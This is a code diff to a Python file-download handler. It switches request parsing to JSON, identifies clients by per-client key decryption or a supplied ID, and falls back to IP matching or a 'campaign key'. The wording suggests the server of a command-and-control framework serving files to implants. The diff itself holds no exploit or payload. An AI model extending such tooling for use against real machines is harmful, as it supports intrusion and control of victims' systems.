@@ -17,30 +17,68 @@ class FileDownloadHandler(BaseHandler):
             self.send_error_response(400, "Missing content")
             return
             
-        encrypted_data = self.request_handler.rfile.read(content_length).decode('utf-8')
+        request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
         
-        # Identify the client
-        client_id = self.identify_client()
-                    
         try:
-            # Decrypt the file request data
-            if client_id:
-                file_request = self.crypto_helper.decrypt(encrypted_data, client_id)
-            else:
-                file_request = self.crypto_helper.decrypt(encrypted_data)
+            # Parse the JSON request
+            request_json = json.loads(request_body)
+            encrypted_data = request_json.get('data')
             
+            # Identify client by key-based decryption
+            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
+            
+            # If client identification failed but client_id was provided in request
+            if client_id is None and 'client_id' in request_json:
+                provided_client_id = request_json.get('client_id')
+                
+                # Try decryption using the provided client ID
+                try:
+                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
+                    client_id = provided_client_id
+                except Exception as e:
+                    logger.error(f"Failed to decrypt using provided client ID: {e}")
+            
+            if client_id is None or decrypted_data is None:
+                self.send_error_response(400, "Authentication failed - could not decrypt data")
+                return
+                
             # Process the file request
-            response = self._process_file_request(client_id, file_request)
+            response = self._process_file_request(client_id, decrypted_data)
             
             # Encrypt the response
-            if client_id:
-                encrypted_response = self.crypto_helper.encrypt(json.dumps(response), client_id)
-            else:
-                encrypted_response = self.crypto_helper.encrypt(json.dumps(response))
+            encrypted_response = self.crypto_helper.encrypt(json.dumps(response), client_id)
             
             # Send the encrypted response
-            self.send_response(200, "application/json", encrypted_response)
+            self.send_response(200, "application/json", json.dumps({"data": encrypted_response}))
             
+        except json.JSONDecodeError:
+            # For backward compatibility, try to parse the request body directly
+            try:
+                # Use IP-based identification as fallback (less secure)
+                client_id = self._identify_client_by_ip()
+                
+                if client_id:
+                    # Try to decrypt using the client's key
+                    decrypted_data = self.crypto_helper.decrypt(request_body, client_id)
+                else:
+                    # Try using the campaign key
+                    decrypted_data = self.crypto_helper.decrypt(request_body)
+                    client_id = self._identify_client_by_ip()  # Still need a client ID for processing
+                
+                # Process the request
+                response = self._process_file_request(client_id or self.client_address[0], decrypted_data)
+                
+                # Encrypt the response
+                if client_id:
+                    encrypted_response = self.crypto_helper.encrypt(json.dumps(response), client_id)
+                else:
+                    encrypted_response = self.crypto_helper.encrypt(json.dumps(response))
+                
+                # Send the encrypted response (legacy format)
+                self.send_response(200, "application/json", encrypted_response)
+            except Exception as e:
+                logger.error(f"Error handling legacy file download request: {e}")
+                self.send_error_response(500, "Server Error")
         except Exception as e:
             logger.error(f"Error handling file download request: {e}")
             
@@ -53,12 +91,19 @@ class FileDownloadHandler(BaseHandler):
             try:
                 if client_id:
                     encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
+                    self.send_response(200, "application/json", json.dumps({"data": encrypted_error}))
                 else:
-                    encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response))
-                    
-                self.send_response(200, "application/json", encrypted_error)
+                    self.send_error_response(500, "Server Error")
             except:
                 self.send_error_response(500, "Server Error")
+    
+    def _identify_client_by_ip(self):
+        """Identify client based on IP address as fallback"""
+        client_ip = self.client_address[0]
+        for client_id, client_info in self.client_manager.get_clients_info().items():
+            if client_info.get('ip') == client_ip:
+                return client_id
+        return None
             
     def _process_file_request(self, client_id, file_request_json):
         """
